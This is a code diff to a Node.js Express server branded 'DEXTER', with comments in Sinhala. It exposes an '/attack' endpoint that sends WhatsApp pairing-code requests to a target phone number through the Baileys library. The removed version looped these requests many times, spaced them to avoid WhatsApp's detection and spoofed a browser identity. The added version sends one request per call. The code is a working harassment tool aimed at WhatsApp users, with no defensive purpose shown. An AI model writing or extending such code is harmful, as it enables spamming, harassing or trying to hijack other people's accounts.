@@ -1,5 +1,5 @@
 const express = require('express');
-const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const path = require('path');
 
@@ -8,53 +8,34 @@ const PORT = process.env.PORT || 8000;
 
 app.use(express.static('public'));
 
-async function startAttack(target, count) {
-    // Session දත්ත මතක තබා ගැනීමට
-    const { state, saveCreds } = await useMultiFileAuthState('dexter_session');
-    
-    let sock = makeWASocket({
-        auth: state,
-        logger: pino({ level: 'silent' }),
-        printQRInTerminal: false,
-        // සාමාන්‍ය පරිගණකයකින් එන බව පෙන්වීමට
-        browser: ["Mac OS", "Chrome", "10.15.7"]
-    });
-
-    sock.ev.on('creds.update', saveCreds);
-
-    for (let i = 0; i < count; i++) {
-        try {
-            // WhatsApp එකට අහු නොවී ඉන්න තත්පර 20ක විවේකයක්
-            await delay(20000); 
-            
-            await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
-            console.log(`[DEXTER] SUCCESS: ${i + 1} Payload sent to ${target}`);
-            
-        } catch (e) {
-            console.log(`[RECONNECTING] Connection closed. Restarting link...`);
-            // කනෙක්ෂන් එක ගියොත් ආයෙත් Socket එක පණගන්වන්න
-            sock = makeWASocket({
-                auth: state,
-                logger: pino({ level: 'silent' }),
-                browser: ["Mac OS", "Chrome", "10.15.7"]
-            });
-            i--; // අසාර්ථක වූ රවුම් එක ආයෙත් කරන්න
-        }
-    }
-}
-
-app.get('/attack', (req, res) => {
+// එක සැරයකට එක පාරක් පමණක් කෝඩ් එකක් ඉල්ලන API එක
+app.get('/attack', async (req, res) => {
     const target = req.query.num;
-    const count = parseInt(req.query.count) || 10;
-
     if (!target) return res.status(400).json({ error: "Target missing!" });
 
-    startAttack(target, count);
-    res.json({ status: "Injected", target: target });
+    console.log(`[DEXTER-LOG] Injected Payload to: ${target}`);
+
+    try {
+        const { state } = await useMultiFileAuthState('dexter_session');
+        const sock = makeWASocket({
+            auth: state,
+            logger: pino({ level: 'silent' }),
+            browser: ["Ubuntu", "Chrome", "20.0.04"],
+            printQRInTerminal: false
+        });
+
+        // Pairing Code එක ඉල්ලීම
+        await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
+        
+        res.json({ success: true, message: "Payload Delivered" });
+    } catch (e) {
+        console.log(`[DEXTER-ERROR] ${e.message}`);
+        res.status(500).json({ success: false, error: e.message });
+    }
 });
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(process.cwd(), 'index.html'));
 });
 
-app.listen(PORT, () => console.log(`DEXTER Neural Panel running on ${PORT}`));
+app.listen(PORT, () => console.log(`DEXTER Neural Server Live on ${PORT}`));
